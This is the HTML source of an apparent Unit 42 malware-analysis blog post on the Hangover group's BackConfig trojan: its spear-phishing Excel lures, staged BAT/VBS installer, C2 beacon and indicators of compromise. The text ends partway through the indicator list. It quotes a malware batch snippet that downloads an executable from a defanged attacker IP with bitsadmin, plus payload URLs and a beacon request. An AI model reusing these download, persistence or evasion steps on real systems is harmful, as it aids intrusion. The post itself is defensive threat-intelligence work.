
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Updated BackConfig Malware Targeting Government and Military Organizations in South Asia</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/updated-backconfig-malware-targeting-government-and-military-organizations/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="New campaigns using an updated BackConfig malware by Hangover group were found targeting government and military organizations in South Asia."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Updated BackConfig Malware Targeting Government and Military Organizations in South Asia" />
<meta property="og:description" content="New campaigns using an updated BackConfig malware by Hangover group were found targeting government and military organizations in South Asia." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="BackConfig" />
<meta property="article:tag" content="Hangover Threat Group" />
<meta property="article:tag" content="malware" />
<meta property="article:tag" content="spearphishing" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2020-05-12T04:30:43+00:00" />
<meta property="article:modified_time" content="2020-05-15T06:32:12+00:00" />
<meta property="og:updated_time" content="2020-05-15T06:32:12+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/11/Malware-r3d2-1024x512.png" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/11/Malware-r3d2-1024x512.png" />
<meta property="og:image:width" content="1024" />
<meta property="og:image:height" content="512" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="New campaigns using an updated BackConfig malware by Hangover group were found targeting government and military organizations in South Asia." />
<meta name="twitter:title" content="Updated BackConfig Malware Targeting Government and Military Organizations in South Asia" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/11/Malware-r3d2.png" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Updated BackConfig Malware Targeting Government and Military Organizations in South Asia Comments Feed" href="https://unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations/feed/" />
<meta property="og:likes" content="9"/>
<meta property="og:readtime" content="16"/>
<meta property="og:views" content="22,536"/>
<meta property="og:date_created" content="May 11, 2020 at 9:30 PM"/>
<meta property="og:post_length" content="5127"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit-42/"/>
<meta property="og:author" content="Alex Hinchliffe"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/alex-hinchliffe/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:post_image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/11/Malware-r3d2-380x184.png"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Updated BackConfig Malware Targeting Government and Military Organizations in South Asia","name":"Updated BackConfig Malware Targeting Government and Military Organizations in South Asia","description":"New campaigns using an updated BackConfig malware by Hangover group were found targeting government and military organizations in South Asia.","url":"https:\/\/unit42.paloaltonetworks.com\/updated-backconfig-malware-targeting-government-and-military-organizations\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/updated-backconfig-malware-targeting-government-and-military-organizations\/","datePublished":"May 11, 2020","articleBody":"Executive Summary\r\nUnit 42 has observed activity over the last 4 months involving the BackConfig malware used by the Hangover threat group (aka Neon, Viceroy Tiger, MONSOON). Targets of the spear-phishing attacks, using local and topical lures, included government and military organizations in South Asia.\r\n\r\nThe BackConfig custom trojan has a flexible plug-in architecture for components offering various features, including the ability to gather system and keylog information and to upload and execute additional payloads.\r\n\r\nThe initial infection occurs via a weaponized Microsoft Excel (XLS) document delivered via compromised legitimate websites for which the URLs are most likely shared via email. The documents use Visual Basic for Applications (VBA) Macro code which, if enabled by the victim, starts an installation process consisting of multiple components that result in the plug-in loader payload being downloaded and executed. The modular nature certainly allows for quicker changes to individual components and, perhaps more importantly for the attackers, splits up the malicious behaviors in such a way that could thwart sandbox and dynamic analysis systems, especially when analyzing the components in isolation.\r\n\r\nOur threat prevention platform with WildFire detects activity associated with this threat group, while simultaneously updating the \u2018malware\u2019 category within the PAN-DB URL filtering solution for malicious and\/or compromised domains that have been identified.\r\n\r\nIndicators of compromise related to this research are documented at the end of this report and in the Adversary Playbook for the Hangover threat group that can be accessed in the Unit 42 Playbook Viewer.\r\nStarting Point\r\nUnit 42 first saw activity involving the Windows PE executable file (SHA256: 84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c) when searching AutoFocus data related to particular sectors and countries of interest.\r\n\r\nThe file was first seen on January 19th, 2020, having been downloaded by two organizations -- a government department in one country and a military organization in another -- within minutes of each other. The source of the download was http:\/\/212.114.52[.]148\/request\/httpsrequest and the file httpsrequest was stored locally as dphc.exe. More details on how the malware was delivered are described later in the blog.\r\n\r\nThe choice of terminology in URL paths and file names when delivering BackConfig malware in this, and other campaigns discussed later on, is clearly to blend in as benign operations, paths and filenames. Although spelled differently, it could be easy to believe the payload relates to the DHCP networking service.\r\n\r\nThe purpose of this malware is to allow the actors to download and execute an executable file, as well as download and run batch files to run commands on the end system.\r\n\r\nThis sample has a custom \"decryption\" routine that subtracts six from each character. The following strings are decrypted using this method:\r\n\r\n \t\r\n\r\n \tlinkrequest[.]live\r\n \t\\\\Adobe\\\\Driver\\\\dwg\\\\pid.txt\r\n \t\\\\Adobe\\\\Driver\\\\dwg\\\\\r\n \t\\\\Adobe\\\\Driver\\\\dwg\\\\wuaupdt.exe\r\n\r\n\r\n\r\nThe Trojan reads the following file to use in the URL of the C2 beacon. If the file does not exist, the executable will exit without performing any further activities. The pid.txt file is created during the earlier delivery and installation phases starting with the weaponized Excel document. More information about this setup process is covered later in the delivery section. As previously mentioned, this behavior makes an automated analysis of the individual executable payload component harder.\r\n\r\n \t\r\n\r\n \t%USERPROFILE%\\Adobe\\Driver\\dwg\\pid.txt\r\n\r\n\r\n\r\nThe C2 channel uses HTTPS thanks to the INTERNET_FLAG_SECURE flag used when calling the HttpOpenRequestA function. The beacon HTTP request will look like the following:\r\n\r\nGET \/orderme\/[contents of pid.txt file] HTTP\/1.1\r\nUser-Agent: Mozilla\/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko\/20100101 Firefox\/52.0 @\/NEW\r\nHost: linkrequest[.]live [resolving to 23.106.123[.]87]\r\n\r\nThe Trojan will look for the following field and values within the HTTP response header:\r\n\r\n \t\r\n\r\n \t\"Content-Type: application\"\r\n \t\"Content-Type: xDvsds\"\r\n \t\"Content-Type: Bw11eW\"\r\n\r\n\r\n\r\nIf the content-type field contains a value of application, the Trojan will extract a filename from the HTTP response headers between the string filename and Content-Transfer-Encoding. It will use this filename to create a file in the %USERPROFILE%\\Adobe\\Driver\\dwg\\ folder, which it will write the data in the HTTP response to. Based on the other two Content-Types, we believe the filename provided will be either \"wuaupdt.exe\" or test.bat.\r\n\r\nIf the content-type field has a value of xDvsds, the Trojan will attempt to execute the following file using ShellExecuteA and the \"open\" method:\r\n\r\n%USERPROFILE%\\Adobe\\Driver\\dwg\\wuaupdt.exe\r\n\r\nIf the content-type field has a value of Bw11eW, the Trojan will attempt to execute the following file using ShellExecuteA and the \"open\" method:\r\n\r\n%USERPROFILE%\\Adobe\\Driver\\dwg\\test.bat\r\n\r\nAt the time of writing, the C2 appeared inoperational and no further payloads were seen. We believe that the resultant wuaupdt.exe file would then provide further capabilities to steal information, log keystrokes, and provide the ability to run additional commands either directly or via additional plugins which it would download, as documented by the Qihoo 360 Threat Intelligence group in their investigation of prior campaigns here.\r\n\r\nUnit 42 has conducted cursory binary diffing for many of the BackConfig executable files and did not find any non-library function overlaps that would suggest that the payloads are based on the YTY or EHDev frameworks as mentioned here and here.\r\nPE Metadata\r\nThe malware sample contains some interesting static artifacts including self-signed digital certificates used to sign the executable purporting to be software from the Foxit Software Incorporated company based in California. It is not known why the actors picked this company -- and others listed in Table 1 below -- to impersonate but, as previously mentioned, their use of filenames and URLs makes their payloads appear benign and trustworthy.\r\n\r\nUsing this meta-data, together with information gleaned from infrastructure investigation, Unit 42 were able to pivot around on AutoFocus data to find additional BackConfig PE executable samples. Those samples from the last 12 months are listed in Tables 1 and 2 below.\r\n\r\n\r\n\r\nSHA256\r\nCompilation Time (UTC)\r\nFirst Seen (Pacific)\r\nSigner Name\r\n\r\n\r\n84e5629...\r\n01\/20\/2020 7:26:09am\r\n01\/19\/2020 11:49:03pm\r\nFoxit Software Incorporated\r\n\r\n\r\n18ce3ee...\r\n10\/10\/2019 9:22:11am\r\n01\/16\/2020 4:30:26pm\r\n\r\n\r\n4a4bc01...\r\n11\/21\/2019 9:19:49am\r\n01\/16\/2020 1:31:46am\r\nwind0ws\r\n\r\n\r\n91c67c1...\r\n11\/21\/2019 9:19:49am\r\n12\/02\/2019 2:03:41am\r\n\r\n\r\nde5b670...\r\n11\/21\/2019 9:19:49am\r\n11\/21\/2019 11:59:05pm\r\n\r\n\r\nf79ebf0...\r\n10\/28\/2019 5:35:26am\r\n11\/09\/2019 10:32:09pm\r\nNVIDIA Corporation\r\n\r\n\r\n31faeef...\r\n10\/10\/2019 9:22:11am\r\n10\/13\/2019 10:11:04pm\r\nFoxit Software Incorporated\r\n\r\n\r\nd87b875...\r\n09\/12\/2019 5:54:04am\r\n09\/26\/2019 9:32:19am\r\nDigicert Global\r\n\r\n\r\n1510996...\r\n12\/05\/2018 4:35:03am\r\n04\/09\/2019 10:30:16am\r\nFoxit Software Incorporated\r\n\r\n\r\n\r\nTable 1. Describing PE compile times and Digital signatures used, ordered by first seen.\r\nThe Compilation Time stored in executable (SHA256: 84e5629...) appears to be after the point at which the file was first seen by our WildFire analysis system. While the PE file timestamp could be modified post-compilation, the oddity is more likely explained away with time zones -- 2349 Pacific time on the 19th is 1349 in Bangladesh on the 20th, and 7:26am UTC is in the range of 11:26 to 13:26 across the South Asia region, which would make the sample compilation quite recent with respect to the delivery of it.\r\n\r\nMore details about the self-signed digital certificates, as well as full hashes, can be found in the IOCs section at the end of this report.\r\n\r\nThe following table shows the version information from the same PE files, grouped by similar File Description fields. The order remains the same, except for the sample (SHA256: 18ce3ee...) which was first seen January 16th, 2020 but for some reason reverted to using exact version information seen in samples two to three months prior. Namely, Link Finder.\r\n\r\n\r\n\r\nSHA256\r\nFile Description\r\nFile Version\r\nProduct Name\r\nProduct Version\r\nCopyright\r\n\r\n\r\n84e5629...\r\n\u0410\u043b\u044c\u0431\u0435\u0440\u0442 (Albert, in English)\r\n06.10.2015\r\n\u0410\u043b\u044c\u0431\u0435\u0440\u0442\r\n01.05.2015\r\nCopyright @ 2015-2026 secosec\r\n\r\n\r\n4a4bc01...\r\n\u0421\u0441\u044b\u043b\u043a\u0430\r\n\r\n(Link, in English)\r\n01.01.12\r\n\u0441\u0441\u044b\u043b\u043a\u0430\r\n10.01.2015\r\nCopyright @ 2011-2021 secosec Inc. \u0412\u0441\u0435 \u043f\u0440\u0430\u0432\u0430 \u0437\u0430\u0449\u0438\u0449\u0435\u043d\u044bk (All rights reserved, in English)\r\n\r\n\r\n91c67c1...\r\n\r\n\r\nde5b670...\r\n\r\n\r\n18ce3ee...\r\nLink Finder\r\n01.01.12\r\nLink Finder\r\n13,9,1632\r\nCopyright @2011-2020 Techtest Inc. All Rights Reserved\r\n\r\n\r\nf79ebf0...\r\n\r\n\r\n31faeef...\r\n\r\n\r\nd87b875...\r\nscrapper\r\n01.12.001\r\nscrapper\r\n13,6,1662\r\nCopyright @Scrapper Ltd Reserved\r\n\r\n\r\n1510996...\r\nsystem process\r\n2,1,1,2015\r\nsystem process cleaner\r\n2,1,1,2015\r\nCopyright \u00a9 2004-2018 Foxit Software Inc. All Rights Reserved\r\n\r\n\r\n\r\nTable 2. Describing PE version info metadata, ordered by first seen and grouped on matching data.\r\nOf the set, the file (SHA256: 1510996...) has most consistency in terms of a theme, using the Foxit Copyright information, self-signed digital signature and even using the company logo, as shown in the Figure below, for the executable file\u2019s icon. The file\u2019s copyright information only differs from that of Foxit\u2019s Reader software by a missing period symbol, implying it was copied rather than created.\r\n\r\nThe actors then moved to use seemingly fictitious company and product names while using a mixture of signer names in their digital signatures. No file icons were used at all over the last 11 months.\r\n\r\nRecent samples also included Cyrillic text in the file description, product name, and copyright fields, as shown and translated in the table above. It\u2019s hard to know if this is an attempt to set false flags as to the origins of the BackConfig malware, or perhaps to make the content more relevant to specific targets within the victim organizations.\r\nDelivery and Installation\r\nIn this section, we describe how the various payloads are delivered based on what we have seen in our customer networks, as well as what we have established through open-source research. Unit 42 has yet to see any evidence of weaponized documents used to deliver BackConfig being attached on phishing emails and that phishing URL links in emails appear to be the Hangover group\u2019s modus operandi.\r\n\r\nThe remainder of this section focuses largely on Object Linking and Embedding (OLE) Microsoft Excel documents, as they are most commonly used by the Hangover group, at least when it comes to the BackConfig malware. Through infrastructure analysis however, Unit 42 was able to find a BackConfig PE sample (SHA256: e28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f; first seen 10\/24\/2019) using the C2 domain matissues[.]com and dropped by the weaponised Rich Text Format (RTF) file (SHA256: 752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f) from the same day. The RTF used the CVE-2017-11882 exploit against equation editor vulnerabilities in Office applications to execute the PE sample which was a unique exploitation method compared to all other samples analyzed.\r\nCompromised Third-Party Infrastructure\r\nContinuing to pivot on data obtained from the samples found thus far, we discovered some related URLs relating to compromised third-party infrastructure supporting the delivery of the BackConfig malware. The following table lists some examples of compromised sites delivering weaponised XLS files with filenames, such as Circular_No_03.xls (SHA256: 0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf) and Circullar_Nov_2017.xls (SHA256: ed638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb) implying (even with incorrect spelling) that the contents is, or relates to, a letter or advertisement which is distributed to a large number of people.\r\n\r\n\r\n\r\nSHA-256\r\nFirst Seen\r\nRelated URL\r\nDescription\r\nLocation\r\n\r\n\r\nbe3f12b...\r\n2019-10\r\nhttp:\/\/nsaimmigration[.]com\/userfiles\/image\/\r\n\r\nfbr.php and nphp_registration_form.php (both HTTP 404)\r\nConsultant and Legal Advice company supporting students to live and study abroad.\r\nPakistan\r\n\r\n\r\n0aa5cf1...\r\n2018-09\r\nhttp:\/\/webtechhub[.]com\/wordpress\/wp-content\/images\/fbr_circular.php\r\nWeb design and dev site running outdated WordPress application\r\nPakistan\r\n\r\n\r\ned638b5...\r\n2017-11\r\nhttp:\/\/alphamike.com[.]mv\/housing\r\nShipping agency for freight forwarding and cargo delivery.\r\nMaldives\r\n\r\n\r\nhttp:\/\/mgamphs.edu[.]bd\/info\/ (down)\r\nMuhurigonj Academy of Music and Performance High School. Reference.\r\nBangladesh\r\n\r\n\r\n\r\nTable 3. Compromised third-party infrastructure to support delivery of BackConfig.\r\nGiven the targeting related to these threats, and the compromised third-party websites, we believe the use of \u201cfbr\u201d in some of the URLs above likely relates to the Federal Board of Revenue (FBR) government organization of Pakistan. The \u201cfbr\u201d theme also runs into the VBA macro code. File ed638b5... contains the statement Const WelcomePage = \"FBR\".\r\n\r\nThe old compromised hosting examples in Table 3 above do not rely on Hypertext Preprocessor (PHP) server-side scripts to deliver the weaponized XLS files. Instead, the pages simply used HTTP response status 301 (Moved Permanently) for URL redirection to said XLS, initiating the download. More recent examples make use of PHP with URL filenames matching the social engineering theme, such as \u201cfbr\u201d. In addition, the actors use the PHP script to log any visitors to the page noting in a file named \u201cinfo.txt\u201d the datetime stamp of the event, the client operating system, and their IP address.\r\n\r\nThe location of the compromised third-party infrastructure or the organizations legitimately using them, align with the targeting Unit 42 has seen. This could be pure coincidence, a sign from the threat actors that their intention is to take advantage of weaknesses in the target country\u2019s wider infrastructure, or the threat actors leveraging in-country infrastructure that may be considered more trustworthy by the intended victims and their security solutions.\r\n\r\nPalo Alto Networks\u2019 WildFire sandbox analyzed sample ed638b5... on November 8th, 2017, and, as described in the table above, the sample was hosted on two compromised websites: a Bangladesh school and a Maldivan shipping agency. While Unit 42 has not seen Hangover activity in the Maldives, the archipelago is in the region alongside other known targets and interestingly, swore in a new President about a week after Unit 42 analyzed the sample.\r\n\r\nThe EXE payload (SHA256: 4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd) downloaded directly by the VBA code in sample ed638b5... from the URL below relates to those documented by BitDefender here. To date, Unit 42 has only seen 6 similar samples since the late-2017 timeframe for this sample, compared to many more prior, perhaps indicating a change over of the custom payloads used by the Hangover group. Certainly, there are some overlaping Tactics Techniques and Procedures (TTPs) between the older samples and the more recent BackConfig samples.\r\n\r\nhttp:\/\/chancetowin.quezknal[.]net\/appstore\/updatepatch\/logs.exe\r\nEvolution of Delivery Payloads\r\nBefore moving on to describe the most recent samples and installation methods used by the Hangover actors, the timeline figure below provides a high-level view of the evolution in TTPs used.\r\n\r\n[caption id=\"attachment_107190\" align=\"aligncenter\" width=\"600\"] Figure 2. Evolution of delivery payloads[\/caption]\r\n\r\nDespite the evolution over the years, some habits are hard to break. Firstly, every weaponized XLS Unit 42 has investigated loads a fake error message, such as the one shown in Figure 3 below, to trick the victim into thinking that the file is corrupt and thus nothing has -- or will -- load as intended. Another fictitious error message text has been used in the past often with poor spelling or grammar.\r\n\r\n[caption id=\"attachment_107192\" align=\"aligncenter\" width=\"600\"] Figure 3. Example fake error message displayed to the victim.[\/caption]\r\n\r\nSimilarly, the version information metadata stored in all the Excel documents analyzed share the same Author and Last Modified By names - Testing.\r\n\r\nThe following subsections describe the campaigns and malware as highlighted by the three most recent milestones in the timeline figure above.\r\n2019 Milestone: Multi-Component\r\nRegistration Form.xls (SHA256: be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461) listed in Table 3 above provides an example of the types of lures used by the threat actors.\r\n\r\nUpon opening the XLS and enabling the macro code, the picture in Figure 4 below is shown on top white-background cells. As the filename suggests, it\u2019s a registration form and relates to the Naya Pakistan Housing program run by the Pakistani government to help solve the housing shortfall in the country. Eligible citizens include government employees and registration forms were due by October 15th, 2019 (extended through November 15th), meaning the timing and the lure of the campaign on October 25th were clearly planned to increase the chances of compromise.\r\n\r\n[caption id=\"attachment_107194\" align=\"aligncenter\" width=\"600\"] Figure 4. Social engineering lure against Pakistan government in October 2019[\/caption]\r\n\r\nAs the PHP webpages did not exist at the time of writing, Unit 42 cannot prove the XLS file be3f12b... was hosted at the URL listed in row 1 of Table 3 above. However, because of the following points, we have high confidence in the campaign relationship between the two.\r\n\r\n \t\r\n\r\n \tAutoFocus and VirusTotal first processed the XLS file be3f12b... on October 25th, 2019\r\n \tVirusTotal processed the nsaimmigration... URL on the same day\r\n \tA specific HTTP GET request URL using the notation nphp_registration_form.php?r= was processed in VirusTotal on the same day, and has relations to http:\/\/185.203.119[.]184\/fin_div\/session, which matches the IP address and URL structure in the VBS code dropped by the XLS be3f12b....\r\n \tThe name of the PHP webpage nphp_registration_form.php relates to the filename of the XLS.\r\n\r\n\r\n\r\nThe VBA macro code in the XLS file be3f12b... differed somewhat from that of the samples of the previous years. Instead of directly storing encoded EXE files or running batch shell commands directly from the VBA code itself, it retrieved the content from hidden columns in the Excel sheet, starting at column 27 or \u201cAA\u201d, which is likely to be off-screen for most people. Once the font colour was changed, the \u201csetup\u201d batch code component as per previous variants, and the new Visual Basic Script (VBS) downloader component were revealed in columns AA and AB, respectively, as shown in figure 5 below.\r\n\r\n[caption id=\"attachment_107196\" align=\"aligncenter\" width=\"600\"] Figure 5. VBS downloader and BAT setup file revealed in the XLS sheet.[\/caption]\r\n\r\nMacro VBA code in the XLS parses the content of the two columns line by line writing the contents to their respective files on disk and executing them following the same process flow as described below in Figure 6.\r\n2019 Milestone: BITS and ZIPs\r\nA more recent weaponized XLS file (SHA256: 021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b) was analyzed by WildFire on November 15th, 2019 and exposed some new techniques. On this occasion, the VBA macro code contained a decimal-encoded ZIP file of only 1,062 bytes in size. Inside the ZIP archive were two text files that would be decompressed to a folder driverkit. One file, driverkit.bat, is the \u201csetup\u201d BAT file already discussed in this report and listed in the appendix section. The other file, Winmgt.txt, is an adaptation of the VBS downloaded also described in this report. However, instead of a direct HTTP download using an MSXML DOM object, this version writes the following contents to Winmgt_Drive.bat, which is executed by a third scheduled task created by the \u201csetup\u201d BAT file.\r\necho off\r\nbitsadmin \/transfer Microsoft_Update \/download \/priority high \r\nhttp:\/\/185.203.119[.]184\/winmgt\/winmgt.exe \r\n%USERPROFILE%\\Adobe\\Driver\\pdf\\winmgt.exe\r\ndel %0\r\n2020 Milestone: Fine Tuning\r\nThe following execution flow diagram is based on one of the most recent weaponized documents Unit 42 has seen Invoice.xls (SHA256: 8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c; first seen 2020-01-15).\r\n\r\nThe infection process consists of multiple components as just described. The \u201csetup\u201d batch (BAT) file coordinates much of the infection process of the BackConfig plug-in loader once the VBA has written it to disk and executed it.\r\n\r\n[caption id=\"attachment_107198\" align=\"aligncenter\" width=\"600\"] Figure 6. Execution flow of BackConfig malware[\/caption]\r\n\r\nThe numbered bullet list below describes Figure 6.\r\n\r\n \t\r\n\r\n \tText file Drive.txt (SHA-256: 4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1) is created and contains the decimal-decoded VBS content.\r\n \tSimilarly, the VBA code then writes batch code to another text file - Audio.txt. The content of both files is shown in the appendix section of this report.\r\n \tAudio.txt is renamed to Audio.bat and executed.\r\n \tAudio.bat cleans up any files and folders related to previous infections, and recreates the required environment including creating the aforementioned pid.txt file, and setting various folders and files to be hidden from a default Windows Explorer view. The contents of pid.txt is the victim\u2019s computer name concatenated with a hyphen followed by a random number, although I believe the code used would not work as intended.\r\n \tAudio.bat continues by creating two scheduled tasks referencing two files that are yet to exist: dphc.exe will run every 10 minutes and Drive.vbs at 20 minute intervals.\r\n \tFinally, before deleting itself, Audio.bat will rename Drive.txt to Drive.vbs. When Drive.vbs is eventually executed by the task scheduler, it will download the BackConfig executable payload. In the case of file 8892279f3... the remote location is http:\/\/185.203.119[.]184\/Dropbox\/request.\r\n \tWhen dphc.exe is eventually executed by the task scheduler, it first checks for the presence of pid.txt (step 4.) and only continues if the file exists.\r\n\r\n\r\n\r\nUltimately, the XLS writes two files to disk, one of which -- the BAT -- immediately modifies some system settings and creates two scheduled tasks. However, this behaviour may not be enough to determine the components as malicious. Only after 20 minutes will the task scheduler execute the VBS downloader component and launch the BackConfig loader EXE, by which time analysis systems may have stopped monitoring.\r\nATT&amp;CK\r\nThe following table describes the TTPs associated with the multiple campaigns described in this report.\r\n\r\n\r\n\r\nTactic\r\nTechnique (Mitre ATT&amp;CK ID)\r\n\r\n\r\nTechnical Information Gathering\r\nAcquire OSINT data sets and information (T1247)\r\n\r\n\r\nConduct social engineering (T1249)\r\n\r\n\r\nAdversary Opsec\r\nCompromise 3rd party infrastructure to support delivery (T1312)\r\n\r\n\r\nBuild Capabilities\r\nCreate custom payloads (T1345)\r\n\r\n\r\nObtain\/re-use payloads (T1346)\r\n\r\n\r\nStage Capabilities\r\nUpload, install, and configure software\/tools (T1362)\r\n\r\n\r\nInitial Compromise\r\nSpear Phishing Link (T1192)\r\n\r\n\r\nExecution\r\nUser Execution (T1204)\r\n\r\n\r\nExploitation for Client Execution (T1203)\r\n\r\n\r\nExecution, Persistence\r\nScheduled Task (T1053)\r\n\r\n\r\nDefense Evasion\r\nCode Signing (T1116)\r\n\r\n\r\nDeobfuscate\/Decode Files or Information (T1140)\r\n\r\n\r\nHidden Files and Directories (T1158)\r\n\r\n\r\nObfuscated Files or Information (T1027)\r\n\r\n\r\nDefense Evasion, Execution\r\nScripting (T1064)\r\n\r\n\r\nDefense Evasion, Persistence\r\nBITS Jobs (T1197)\r\n\r\n\r\nCommand &amp; Control\r\nCommonly Used Port (T1043)\r\n\r\n\r\nStandard Application Layer Protocol (T1071)\r\n\r\n\r\nStandard Cryptographic Protocol (T1032)\r\n\r\n\r\nRemote File Copy (T1105)\r\n\r\n\r\n\r\nConclusion\r\nThe Hangover group (aka Neon, Viceroy Tiger, MONSOON) is active and targeting, according to Unit 42\u2019s visibility, government and military organisations in South Asia using spear-phishing emails containing letters or government forms to lure victims into browsing to compromised websites serving weaponized Excel documents that install the BackConfig Trojan. Almost exclusively, Unit 42 has seen the use of weaponized documents that require user execution. Only once in the last six months have we seen use of exploits to circumvent the need for the user to execute any part of the installation chain.\r\n\r\nThe evolution of BackConfig\u2019s primary and secondary payloads has seen different methods used for executing commands and deploying executables both with and without obfuscation.\r\n\r\nThe latest versions contain modular components making it easier to update and re-use code in order to rapidly deploy their campaigns in a timely manner to have the highest chance of success. The method in which the latest samples execute also indicates the group\u2019s focus on trying to evade sandbox and other automated analysis systems by breaking down malicious activity into chunks that each seem relatively benign.\r\n\r\nProtections:\r\n\r\n\r\n\r\n\r\nCortex XDR protects endpoints from all malware, exploits and fileless attacks associated with Hangover actors.\r\n\r\n\r\n\r\nWildFire\u00ae cloud-based threat analysis service accurately identifies samples associated with these malware families.\r\n\r\n\r\n\r\nThreat Prevention provides protection against the known client and server-side vulnerability exploits, malware, and command and control infrastructure used by these actors.\r\n\r\n\r\n\r\nURL Filtering identifies all phishing and malware domains associated with these actors and proactively flags new infrastructure associated with these actors before it is weaponized.\r\n\r\n\r\n\r\nUsers of AutoFocus&#x2122; contextual threat intelligence service can view malware associated with these attacks using the following tags:\r\n\r\nMore information about the Hangover group and the BackConfig malware can be found in AutoFocus.\r\n\r\n\r\n\r\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org. (This is added to blogs pre-shared with the CTA, when loaded into Wordpress it will be added when appropriate).\r\nIndicators of Compromise\r\nDelivery Documents\r\n56349cf3188a36429c207d425dd92d8d57553b1f43648914b44965de2bd63dd6\r\n8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c\r\n021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b\r\nbe3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461\r\n0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf\r\ned638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb\r\n752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f (RTF using CVE-2017-11882)\r\nBatch Files\r\n4BAFBF6000A003EB03F31023945A101813654D26B7F3E402D1F51B7608B93BCB (Audio.txt \/ .bat from Naya Housing campaign)\r\nC94f7733fc9bdbcb503efd000e5aef66d494291ae40fc516bb040b0d1d8b46c9\r\n6a35d4158a5cb8e764777ba05c3d7d8a93a3865b24550bfb2eb8756c11b57be3\r\n750fc47d8aa8c9ae7955291b9736e8292f02aaaa4f8118015e6927f78297f580\r\n5292f4b4f38d41942016cf4b154b1ec65bb33dbc193a7e222270d4eea3578295\r\nf64dbcd8b75efe7f4fa0c2881f0d62982773f33dcfd77cccb4afc64021af2d9e\r\n98d27e830099c82b9807f19dcef1a25d7fce2c79a048d169a710b272e3f62f6e\r\n29c5dd19b577162fe76a623d9a6dc558cfbd6cddca64ed53e870fe4b66b44096 (driverkit.bat)\r\nabe82ffb8a8576dca8560799a082013a7830404bb235cb29482bc5038145b003 (Winmgt_Drive.bat uses bitsadmin)\r\n02c306bb120148791418136dcea8eb93f8e97fb51b6657fd9468c73fb5ea786c\r\nVBS files\r\n87e8c46d065ace580b1ed28565d1fddaa6df49da1ba83f7b3e9982cd8a0013f1 (One_drivers.txt \/ .vbs from Naya Housing 